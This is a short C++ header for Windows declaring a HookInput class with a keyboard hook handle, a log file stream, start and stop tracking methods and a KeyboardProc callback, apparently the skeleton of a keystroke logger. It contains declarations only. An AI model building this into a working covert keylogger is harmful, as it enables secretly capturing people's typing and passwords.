#pragma once
#include <Windows.h>
#include <stdio.h>
#include <fstream>

class HookInput
{
public:
	void startTracking(void* pParam);
	void stopTracking();

private:
	static HHOOK keyboardHook;
	std::ofstream logFile;

	LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};

